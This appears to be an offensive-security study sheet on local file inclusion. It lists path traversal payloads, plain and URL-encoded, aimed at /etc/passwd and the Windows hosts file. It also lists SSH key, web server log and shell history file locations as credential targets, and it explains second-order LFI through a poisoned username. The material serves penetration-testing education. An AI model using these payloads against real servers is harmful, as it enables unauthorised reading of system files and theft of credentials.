1. View users on machine
2. Search for SSH Keys
3. Search for passwords in log or configuration files (.htaccess, config.php)

```http
/../../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../windows/system32/drivers/etc/hosts
..\..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts

/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/system32/drivers/etc/hosts
\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\windows\system32\drivers\etc\hosts
```

##### SSH Keys
```bash
id_rsa
id_ecdsa
id_ecdsa_sk
id_ed25519
id_ed25519_sk
id_dsa

authorized_keys
id_rsa.keystore
id_rsa.pub
known_hosts
```

##### HTTPD, Apach2, Nginx logs
```bash
/var/log/apache/access.log 
/var/log/apache2/access.log 
/var/log/apache/access_log 
/var/log/apache2/access_log
/var/log/access_log
/var/log/nginx/access.log 
/var/log/nginx/access_log 
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access. log 
/opt/apache2/logs/access_log
/opt/apache2/logs/access.log
/opt/apache/logs/access_log
/opt/apache/logs/access.log
```

##### IIS
```bash
C:\inetpub\logs\LogFiles\W3SVC1\
C:\inetpub\wwwroot\web.config
```

##### Linux user specific
```bash
.bash_history
.mysql_history
.my.cnf
```

##### Windows
```powershell
c:\apache\php\php.ini 
c:\xampp\apache\bin\php.ini  
c:\xampp\apache\logs\access.log
c:\Program Files\Apache Group\Apache\conf\httpd.conf  
c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
c:\Program Files\xampp\apache\conf\httpd.conf  
```

## Second-Order Attacks

As we can see, LFI attacks can come in different shapes. Another common, and a little bit more advanced, LFI attack is a `Second Order Attack`. This occurs because many web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters.

For example, a web application may allow us to download our avatar through a URL like (`/profile/$username/avatar.png`). If we craft a malicious LFI username (e.g. `../../../etc/passwd`), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.

In this case, we would be poisoning a database entry with a malicious LFI payload in our username. Then, another web application functionality would utilize this poisoned entry to perform our attack (i.e. download our avatar based on username value). This is why this attack is called a `Second-Order` attack.

Developers often overlook these vulnerabilities, as they may protect against direct user input (e.g. from a `?page` parameter), but they may trust values pulled from their database, like our username in this case. If we managed to poison our username during our registration, then the attack would be possible.

Exploiting LFI vulnerabilities using second-order attacks is similar to what we have discussed in this section. The only variance is that we need to spot a function that pulls a file based on a value we indirectly control and then try to control that value to exploit the vulnerability.
